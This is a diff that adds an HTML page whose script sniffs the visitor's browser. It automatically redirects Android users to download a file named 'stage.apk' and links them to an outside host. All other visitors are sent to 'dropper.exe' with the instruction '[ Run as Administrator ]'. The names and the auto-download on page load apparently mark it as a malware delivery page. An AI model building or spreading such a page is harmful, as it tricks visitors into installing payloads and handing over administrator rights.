@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<title>rewtaurIrshiyap Page</title>
+
+	<script type="text/javascript">
+		function display(){
+			var userAgent = navigator.userAgent;
+
+			if (userAgent.includes("Android")){
+				var deviceVersion = userAgent.substring(userAgent.lastIndexOf("Android ") + 8, userAgent.lastIndexOf(";"));
+				var version = parseInt(deviceVersion);
+				document.getElementById("version").innerHTML = "Android Version : " + version;
+				document.getElementById("download").innerHTML = "--- Download ---";
+				var url = "https://github.com/rewtaur-irshiyap/remotepage.github.io/releases/download/1.0/stage.apk"
+				window.location = url;
+				document.getElementById("download").href = url;
+				document.getElementById("open").innerHTML = "---  Open App  --";
+				document.getElementById("open").href = "https://ucclqs.deta.dev";
+			}else{
+				document.getElementById("instruction").innerHTML = "[ Run as Administrator ]";
+				var url = "https://github.com/rewtaur-irshiyap/remotepage.github.io/releases/download/1.0/dropper.exe"
+				window.location = url;
+			}
+
+		}
+		
+	</script>
+
+</head>
+
+<body>
+	<br>
+	<h1 align="center" id="version"></h1>
+	<h3 align="center" id="instruction"></h3>
+	<br>
+	<center><a style="font-size: 30px;" align="center" id="download" href=""></a></center>
+	<br>
+	<br>
+	<br>
+	<center><a style="font-size: 30px;" align="center" id="open" href=""></a></center>
+
+	
+	<script>display()</script>
+</body>
+
+</html>
